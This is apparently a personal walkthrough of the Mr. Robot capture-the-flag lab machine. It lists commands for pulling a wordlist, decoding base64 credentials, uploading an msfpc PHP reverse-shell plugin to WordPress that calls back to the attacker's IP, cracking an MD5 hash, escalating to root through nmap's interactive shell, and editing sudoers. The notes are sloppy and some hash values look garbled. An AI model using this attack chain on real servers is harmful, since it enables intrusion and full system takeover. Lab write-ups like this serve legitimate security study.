     It will show what file are present there.
     wp_* <-wordpress files
# mrRobot | cd mrRobot <- Create a local Director for bookeeping
# wget http://192.168.118.89/robots.txt <- what ever is there we tried to copy it on local machine.
# wget http://192.168.118.89/fsocity.dic <- this is a huge file.
# cat fsocity.dic <- bruteforce file think so.
# wget http://192.168.118.89/key-1-of-3.txt
# cat key-1-of-3.txt <- this contain hash.
# hash-identifier
  > 65465544454445454 
  > hash will tell its md5., so we can try online Md5 crackers .
# wget http://192.168.118.89/license
# cat license > pwd.txt  <- Base64 is displayed and we copied in pwd.txt file
# base64 -d -i pwd.txt <- will decode the username and password

on 18 we find pwd, lets try to login fromm GUI .
#  http://192.168.118.89/wp_login < - it should login 

now add plugin 
creating with metsploit payload creator.

# msfpc <-'
# msfpc php 192.168.111.76 1337 msf reverse stageless tcp 
    this will create p.php and p.rc file 

Creating plugin for the php file.
vi p.php
{
  /*
  Plugin Name: MMM
  Plugin URI: www.qrc.com
  Description: reverse shell
  Author: metasploit
  Version: 1337
  Author URI: www.qrc.com 
 */
}

SAve it. and upload to Word Press "plugin module".
Create a ZIP file for upload.
#zip p.zip p.php

in GUI , add new plugin and upload zip file. 
now dont ativiate yet.

Now run the loop back 
# msfconsole -q -r 'p.rc'

Now we can ativate the plugin .

Now in MFSConsole
> help sessions
> sessions -i 1
meterpeter> pwd   <- now we have the command prompt on robot machine.

However we dont have root acces is just a user shell . 
# cd home ; cd robot ; ls 
    key-2-of-3.txt and password-raw-md5.  <- 2 files are displayed.
# cat password-raw-md5 
    robot:9980898809898900-09
# hash-identifyer 
  > 9980898809898900-09  < returns as MD5 

NOw lets go to web and paste in MD5 cracker online web site. 
www.md5-decrypter.com
paste it and get the password . NOw we have a password for "robot"

goto command prompt and login 
using robot username and the password which we got from md5 decrypt web site .

#cat key-2-of-3.txt
4509248504859340859380485  hash 

We dont have any access 
so we can start take nmap shell .version 3.8.1

# nmap --interactive 
# nmap> h for help , we get bash too.

# nmap> !bash <-'

$ whoami <- works <- but not too much of help 
$ exit 

Now run !sh command

nmap> !sh 
# whoami < :) root

cat /root/firstboot_done  < -- nothing in it 
cat /root/key-3-of-3.txt <-- new hahs.

# nano /etc/sudoers
{
  robot ALL=(ALL) ALL
  
}

Now we can login as robot, as we have password for them.

#sudo su 

! Done .
